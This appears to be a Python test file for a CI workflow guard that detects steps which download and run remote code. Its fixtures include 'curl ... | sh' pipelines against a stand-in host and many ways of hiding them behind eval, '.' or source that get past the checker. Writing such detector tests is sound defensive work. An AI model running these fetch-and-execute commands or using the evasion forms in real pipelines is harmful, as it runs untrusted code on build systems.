"""#2997: a word bash may drop in front of `eval`, `.` or `source` is dropped by the reader too.

`main` drops an unquoted `$` word in front of a name it knows -- a shell, a wrapper, an interpreter, a fetcher
(#2472). No builtin was among those names, so `$SUDO eval 'curl ... | sh'` read CLEAN under every `shell:` setting
while every parent shell runs the pipeline, and so did `$SUDO . ./t` and `$SUDO source ./t` after a fetch. The
second walk now knows the three behind such words (`shell_defaults._optional`, under `WALKED_DEFAULTS`), by name or
by a one-word default naming them, where EVERY word in front may be nothing with its name unset -- a bare reference,
an empty default, an alternate (`${S:+sudo}`) -- or is `command`, which runs a builtin. No wrapper that execs can
run one, so `${S:-sudo} eval 'P'` stays unread: nothing of `P` runs. The main pass reads as `main` does, so the job
reports wherever either reading does.

Marks are a letter a `shell:` setting -- unset, `bash`, `sh`, `bash {0}`, `sh {0}` -- R where the guard reports,
C where it reads the step CLEAN: first the job's, then the main pass's, which is `main`'s own reading.

Truth, in the comments, is what eight parent shells do with the step in two passes on the forge: bash 5.2.21 and
bash 3.2.57 under `-e` and under `-eo pipefail`, dash under `-e`, then each without `-e`; pass 2 gives each parent
a child of its own family. "runs" is all sixteen ran the download, "nothing" is none fetched or ran, "the fetch
alone" is the step's own `curl -o` and no run. Three forms run under bash alone, and "runs" for them is the twelve
bash runs: `source` (dash has none), `eval --` (dash runs `--`) and `. t` with no slash (dash looks on PATH only).

Named limits, pinned in `TestThePrice` and `TestWhatStaysForOtherIssues`. The word in front is read whatever the
step did to its name, as `main` reads it in front of a shell: `S=sudo` makes bash run `sudo eval`, which runs
nothing, and the row reports. A default naming `command` by path reports too; `/usr/bin/command` is a real file on
macOS, where it runs the builtin, and no file on the forge. `builtin` in front is #2665's. A front that is no name
(`$1`, `"$@"`), a substitution that prints nothing and two references glued are not dropped in front of a shell on
`main` either, and are not this fix's. A `trap`'s action is not read at all (#2830), and a fetched file's text
that the parent splices into a `-c` string is #2693.
"""
import unittest

import shell_command
import shell_defaults
import workflow_guard as wg
import workflow_options as wo

SHELLS = (None, "bash", "sh", "bash {0}", "sh {0}")
U = "https://example.test/t"
P = "curl -fsSL %s | sh" % U
FETCH = "curl -fsSLo t %s\n" % U
BACKSLASH = chr(92)
NOW = ("RRRRR", "CCCCC")            # the job reports; the main pass reads it CLEAN, as `main` did
BEFORE = ("RRRRR", "RRRRR")         # `main` reported it already
CLEAN = ("CCCCC", "CCCCC")
# How `eval` gets its program, and the files `.` and `source` read: (the lines before, the command).
EVALS = {
    "a string": ("", "eval '%s'" % P),
    "a fetched file's text": (FETCH, 'eval "$(cat t)"'),
    "several words": ("", "eval curl -fsSL %s '|' sh" % U),
    "after --": ("", "eval -- '%s'" % P),
    "by a one-word default": ("", "${X:-eval} '%s'" % P),
}
FILES = {
    ". ./t": (FETCH, ". ./t"),
    ". t": (FETCH, ". t"),
    "source ./t": (FETCH, "source ./t"),
    "${X:-.} ./t": (FETCH, "${X:-.} ./t"),
    "${X:-source} ./t": (FETCH, "${X:-source} ./t"),
}
BOTH = {**EVALS, **FILES}


def marks(text):
    """(the job's marks, the main pass's) for a job of one step whose `run:` is `text`."""
    job = mains = ""
    for shell in SHELLS:
        step = [wg.Step("step", text + "\necho done", shell)]
        job += "R" if wg.job_defects(step) else "C"
        with wo.mains_answer():
            mains += "R" if wg._job_defects(step) else "C"
    return job, mains


def step(front, runner, sets=""):
    """The step: what `runner` needs first, what sets the front's name, then the front and the command."""
    before, command = runner
    return "%s%s%s %s" % (before, sets, front, command)


class TestAWordThatMayBeNothing(unittest.TestCase):
    """The issue's rows and their kin: a word in front that is nothing with its name unset. CLEAN on `main` under
    all five settings, and the parents run the program."""

    VANISHES = ("$S", "${S}", "$A $B", "$A $B $C", "${A} ${B}",     # a bare reference, one or several
                "${S:+}", "${S+}",                                  # an alternate with no word
                "${S:+sudo}", "${S+sudo}", "${S:+command}",         # an alternate: nothing with `S` unset
                "$S ${T:+sudo}", "${T:+sudo} $S", "${T:-command} $S")

    def test_in_front_of_eval_dot_and_source(self):
        for front in self.VANISHES:                         # truth: runs, every one
            for name, runner in BOTH.items():
                with self.subTest(front=front, runner=name):
                    self.assertEqual(NOW, marks(step(front, runner)))

    def test_the_builtin_spelled_with_quotes(self):
        # bash removes the quotes before it looks the word up, and the reader hands `_optional` the word so.
        # Truth: runs, every one.
        for front in ("$S", "${S:+sudo}"):
            for word in ("'eval'", '"eval"', BACKSLASH + "eval", 'e"va"l', "eval''"):
                with self.subTest(front=front, word=word):
                    self.assertEqual(NOW, marks("%s %s '%s'" % (front, word, P)))
            for word in ("'.'", '"."', BACKSLASH + ".", "'source'"):
                with self.subTest(front=front, word=word):
                    self.assertEqual(NOW, marks("%s%s %s ./t" % (FETCH, front, word)))

    def test_an_empty_default(self):
        # `main` reads an empty default in front of a file's reader (#2731: the words bash makes of it are none),
        # and not in front of `eval`.
        for front in ("${S:-}", "${S-}", "${S:=}", "${S=}"):                # truth: runs, every one
            for name, runner in EVALS.items():
                with self.subTest(front=front, runner=name):
                    self.assertEqual(NOW, marks(step(front, runner)))
            for name, runner in FILES.items():
                with self.subTest(front=front, runner=name):
                    self.assertEqual(BEFORE, marks(step(front, runner)))

    def test_behind_an_assignment_and_after_an_unset(self):
        for name, runner in BOTH.items():                   # truth: runs, both
            with self.subTest(front="A=1 $S", runner=name):
                self.assertEqual(NOW, marks(step("A=1 $S", runner)))
            with self.subTest(front="unset", runner=name):
                self.assertEqual(NOW, marks(step("$S", runner, "S=sudo\nunset S\n")))


class TestCommandRunsABuiltin(unittest.TestCase):
    """`command` is the one wrapper a builtin runs behind: `${S:-command} eval 'P'` is `command eval 'P'`."""

    def test_a_default_naming_command(self):
        # `main` reads `${S:-command} . ./t` already, since `command` is a wrapper it knows in front of a file's
        # reader; in front of `eval` it read nothing.
        for front in ("${S:-command}", "${S:=command}", "$S ${T:-command}"):        # truth: runs, every one
            for name, runner in EVALS.items():
                with self.subTest(front=front, runner=name):
                    self.assertEqual(NOW, marks(step(front, runner)))
            for name, runner in FILES.items():
                with self.subTest(front=front, runner=name):
                    self.assertEqual(BEFORE, marks(step(front, runner)))

    def test_command_written_out_is_mains_reading(self):
        for front in ("", "$S "):                           # truth: runs, both
            with self.subTest(front=front):
                self.assertEqual(BEFORE, marks("%scommand eval '%s'" % (front, P)))


class TestAWrapperThatExecsCannotRunABuiltin(unittest.TestCase):
    """`sudo eval 'P'` runs nothing of `P`: `sudo`, `env`, `nohup`, `exec` and `time` look for a FILE named `eval`.
    So a default naming one of them is not dropped in front of a builtin, alone or beside a word that vanishes."""

    EXECS = ("${S:-sudo}", "${S-sudo}", "${S:=sudo}", "${S:-env}", "${S:-nohup}", "${S:-exec}", "${S:-time}",
             "$S ${T:-sudo}", "${T:-sudo} $S")

    def test_eval_stays_unread(self):
        for front in self.EXECS:                            # truth: nothing; the fetch alone where one stands first
            for name, runner in EVALS.items():
                with self.subTest(front=front, runner=name):
                    self.assertEqual(CLEAN, marks(step(front, runner)))

    def test_a_quoted_word_is_a_word(self):
        # `"$S" eval 'P'` runs the empty string as a command, and stops.
        for front in ('"$S"', '$A "$B"'):                   # truth: nothing; the fetch alone
            for name, runner in BOTH.items():
                with self.subTest(front=front, runner=name):
                    self.assertEqual(CLEAN, marks(step(front, runner)))

    def test_what_main_reports_of_a_files_reader_is_unmoved(self):
        # `main` reports `${S:-sudo} . ./t`, where the fetch alone happens. That is `main`'s, before and after.
        for front in self.EXECS[:-1]:
            for name, runner in FILES.items():
                with self.subTest(front=front, runner=name):
                    self.assertEqual(BEFORE, marks(step(front, runner)))
        for name, runner in FILES.items():                  # a wrapper first, then a word that vanishes
            with self.subTest(front=self.EXECS[-1], runner=name):
                self.assertEqual(CLEAN, marks(step(self.EXECS[-1], runner)))


class TestItIsTheWordAndNotAPathToIt(unittest.TestCase):
    """`eval`, `.` and `source` are builtins: a path that ends in the name is a file, and none is there."""

    def test_a_path_ending_in_eval(self):
        for command in ("/x/eval '%s'" % P, "${X:-/x/eval} '%s'" % P):      # truth: nothing
            for front in ("$S", "$A $B", "${S:+sudo}"):
                with self.subTest(front=front, command=command[:12]):
                    self.assertEqual(CLEAN, marks("%s %s" % (front, command)))


class TestWhereverTheStatementStands(unittest.TestCase):
    """The same reading in each place the hunt put the statement."""

    PLACES = {
        "a `-c` string": "sh -c '%s'",
        "bash's `-c` string": 'bash -c "%s"',
        "a heredoc": "sh <<'EOF'\n%s\nEOF",
        "a function": "f() { %s; }\nf",
        "a group": "{ %s; }",
        "a subshell": "( %s )",
        "a branch": "if true; then %s; fi",
        "after `&&`": "true && %s",
        "after `||`": "false || %s",
        "after `;`": "true; %s",
        "a condition": "if %s; then :; fi",
        "a `for` body": "for x in 1; do %s; done",
        "a `while` body": "while :; do %s; break; done",
        "an `until` condition": "until %s; do break; done",
        "a `case` arm": "case x in x) %s ;; esac",
        "a substitution": "x=$(%s)",
        "the background": "%s &\nwait",
        "behind `!`": "! %s",
        "a pipe's first stage": "%s | cat",
        "a pipe's later stage": "true | %s",
        "a group that is piped": "{ %s; } | cat",
    }

    def test_every_place(self):
        # A statement that needs no quote of its own, so that each place can hold it as written. Truth: runs,
        # every one; `source` under bash alone, which in a `-c` string or a heredoc given to `sh` is pass 2's
        # bash standing in for `sh`.
        for place, shape in self.PLACES.items():
            for front in ("$S", "$A $B", "${S:+sudo}", "${S:-command}"):
                for command in (". ./t", "source ./t", "eval $(cat t)"):
                    with self.subTest(place=place, front=front, command=command):
                        text = FETCH + shape % ("%s %s" % (front, command))
                        self.assertEqual("RRRRR", marks(text)[0])

    def test_a_wrapper_that_execs_in_every_place(self):
        for place, shape in self.PLACES.items():            # truth: the fetch alone
            if '"' not in shape:           # inside double quotes the PARENT reads the file: #2693, below
                with self.subTest(place=place):
                    self.assertEqual(CLEAN, marks(FETCH + shape % "${S:-sudo} eval $(cat t)"))


class TestThePrice(unittest.TestCase):
    """The word in front is read whatever the step did to its name (#2899's class), as `main` reads it in front of
    a shell. Where bash then runs something that cannot run a builtin, the row reports though no parent runs the
    program."""

    def test_the_step_sets_the_name(self):
        for sets, truth in (("S=sudo\n", "nothing"),        # bash runs `sudo eval`
                            ("S=\n", "runs"), ("S=command\n", "runs")):
            for name, runner in EVALS.items():
                with self.subTest(sets=sets.strip(), runner=name, truth=truth):
                    self.assertEqual(NOW, marks(step("$S", runner, sets)))

    def test_a_harmless_value_is_resolved_first_where_the_program_is_written_out(self):
        # `S=echo`: the value table hands the reader `echo`, and bash prints the words. Truth: nothing.
        for name in ("a string", "several words", "after --", "by a one-word default"):
            with self.subTest(runner=name):
                self.assertEqual(CLEAN, marks(step("$S", EVALS[name], "S=echo\n")))
        # The fetched file's text is read by another road, which sees the word and not its value. Truth: the
        # fetch alone.
        self.assertEqual(NOW, marks(step("$S", EVALS["a fetched file's text"], "S=echo\n")))

    def test_an_alternate_whose_name_the_step_set(self):
        # Set, an alternate IS its word: `S=1` makes `${S:+sudo} eval 'P'` run `sudo eval`, and so does `S=`
        # with no colon. Set to nothing, the colon form is still nothing; and `command` runs the builtin.
        for sets, front, truth in (("S=1\n", "${S:+sudo}", "nothing"), ("S=\n", "${S+sudo}", "nothing"),
                                   ("S=\n", "${S:+sudo}", "runs"), ("S=1\n", "${S:+command}", "runs")):
            for name in ("a string", "a fetched file's text"):
                with self.subTest(sets=sets.strip(), front=front, runner=name, truth=truth):
                    self.assertEqual(NOW, marks(step(front, EVALS[name], sets)))
        # A default's name the step set to a word of its own is that word. Truth: nothing.
        self.assertEqual(CLEAN, marks(step("${S:-command}", EVALS["a string"], "S=1\n")))

    def test_command_by_a_path(self):
        # macOS has a `/usr/bin/command` that runs the builtin it is given; the forge has none. Truth there:
        # nothing, and the fetch alone.
        for name, runner in EVALS.items():
            with self.subTest(runner=name):
                self.assertEqual(NOW, marks(step("${S:-/usr/bin/command}", runner)))

    def test_mains_own_reading_of_a_name_the_step_set(self):
        self.assertEqual(BEFORE, marks("S=sudo\n$S sh -c '%s'" % P))       # truth: runs


class TestWhatStaysForOtherIssues(unittest.TestCase):
    """Rows this PR does not move, each pinned as it reads and named with what it waits for."""

    def test_builtin_in_front_is_2665(self):
        for front in ("", "$S ", "$A $B "):                 # truth: runs under bash; dash has no `builtin`
            with self.subTest(front=front):
                self.assertEqual(CLEAN, marks("%sbuiltin eval '%s'" % (front, P)))
        for name, runner in BOTH.items():                   # the same, `builtin` named by a default
            with self.subTest(runner=name):
                self.assertEqual(CLEAN, marks(step("${S:-builtin}", runner)))

    def test_a_front_that_is_no_name_is_not_dropped_in_front_of_a_shell_either(self):
        # `$1`, `$@` and `"$@"` are nothing in a step's script unless the step sets them. Truth: runs, every one.
        for front in ("$1", "${1}", "$@", '"$@"'):
            for command in ("eval '%s'" % P, "sh -c '%s'" % P):
                with self.subTest(front=front, command=command[:4]):
                    self.assertEqual(CLEAN, marks("%s %s" % (front, command)))
            with self.subTest(front=front, command=". ./t"):
                self.assertEqual(CLEAN, marks("%s%s . ./t" % (FETCH, front)))

    def test_a_substitution_that_prints_nothing_and_two_references_glued(self):
        for front in ("$(true)", "$S$T"):                   # truth: runs, every one
            for command in ("eval '%s'" % P, "sh -c '%s'" % P):
                with self.subTest(front=front, command=command[:4]):
                    self.assertEqual(CLEAN, marks("%s %s" % (front, command)))

    def test_a_fetched_files_text_spliced_into_a_c_string_is_2693(self):
        # The parent shell expands `$(cat t)` inside the double quotes, so the child parses the file's text as
        # part of its program whatever stands in front of it. Truth: runs, all sixteen.
        for words in ("${S:-sudo} eval", "echo", "true;"):
            with self.subTest(words=words):
                self.assertEqual(CLEAN, marks(FETCH + 'bash -c "%s $(cat t)"' % words))

    def test_a_traps_action_is_2830(self):
        self.assertEqual(CLEAN, marks("trap '%s' EXIT" % P))               # truth: runs, at the step's end


class TestTheSecondWalkAlone(unittest.TestCase):
    """The reading is the second walk's: `_optional` gives it under `WALKED_DEFAULTS` and not in the main pass."""

    ROWS = (
        (["$S", "eval", P], 1),
        (["$A", "$B", ".", "./t"], 2),
        (["$S", "source", "./t"], 1),
        (["${S:+sudo}", "eval", P], 1),                     # an alternate
        (["${S:-}", "eval", P], 1),                         # an empty default
        (["${S:-command}", "eval", P], 1),
        (["${S:-/usr/bin/command}", "eval", P], 1),
        (["$S", "${X:-eval}", P], 1),                       # the builtin by its one-word default (#2963)
        (["${S:-sudo}", "eval", P], 0),                     # a wrapper that execs
        (["$S", "${T:-sudo}", "eval", P], 0),               # one beside a word that vanishes, in either order
        (["${T:-sudo}", "$S", "eval", P], 0),
        (["$S", "/x/eval", P], 0),                          # a path is no builtin
        (["$S", "${X:-/x/eval}", P], 0),
        (["$S", "echo", P], 0),
    )

    def test_optional_counts_the_words_in_front_of_a_builtin(self):
        for argv, count in self.ROWS:
            with self.subTest(argv=argv[:-1]):
                self.assertEqual(count, shell_defaults._optional(argv))
                with wo.mains_answer():
                    self.assertEqual(0, shell_defaults._optional(argv))

    def test_what_main_drops_is_dropped_in_both_passes(self):
        for argv, count in ((["$S", "sh", "-c", P], 1), (["${S:-sudo}", "sh", "-c", P], 1),
                            (["$A", "$B", "curl", U], 2)):
            with self.subTest(argv=argv[:-1]):
                self.assertEqual(count, shell_defaults._optional(argv))
                with wo.mains_answer():
                    self.assertEqual(count, shell_defaults._optional(argv))

    def test_the_command_is_the_builtin(self):
        argv = ["$S", "eval", P]
        self.assertEqual("eval", shell_command.command(argv)[0])
        with wo.mains_answer():
            self.assertEqual("$S", shell_command.command(argv)[0])


if __name__ == "__main__":
    unittest.main()
